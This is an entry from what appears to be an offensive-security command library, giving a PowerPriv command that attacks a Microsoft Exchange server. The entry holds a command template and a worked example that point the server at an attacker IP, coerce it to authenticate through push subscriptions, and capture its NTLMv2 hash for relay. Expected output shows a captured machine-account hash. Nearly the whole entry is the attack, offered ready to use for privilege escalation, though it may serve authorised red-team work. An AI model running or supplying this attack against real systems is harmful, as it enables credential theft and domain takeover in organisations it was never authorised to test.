---
id: bf639853-e9a8-44b1-bc2c-c2aa59e57442
name: powerpriv-attack-exchange-server
type: command
executor: powershell
data: >-
  powerPriv -targetHost $_EXCHANGE_HOST -attackerHost $_ATTACKER_IP -Version
  $_EXCHANGE_VERSION
output: null
created_at: '2023-04-06T03:56:08.022755+00:00'
updated_at: '2023-04-10T20:26:32.381858+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - exchange
verified: true
validated: true
---

# powerpriv-attack-exchange-server

## Command

```powershell
powerPriv -targetHost $_EXCHANGE_HOST -attackerHost $_ATTACKER_IP -Version $_EXCHANGE_VERSION
```

## Description

Executes PowerPriv to attack an Exchange server by coercing authentication via push subscriptions, capturing NTLM hashes for relay.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -targetHost $_EXCHANGE_HOST | Exchange server hostname (e.g., corpExch01) | Yes |
| -attackerHost $_ATTACKER_IP | Attacker IP for relay (e.g., 192.168.1.17) | Yes |
| -Version $_EXCHANGE_VERSION | Exchange version (e.g., 2016) | Yes |

## Examples

### Basic Usage

```powershell
powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016
```

## Expected Output

[*] Connecting to Exchange...
[*] Subscribing to push notifications
[*] Captured NTLMv2 hash: MAIL01$::domain:...

## Related

- [[procedures/PrivExchange-Attack-with-NTLM-Relay]]
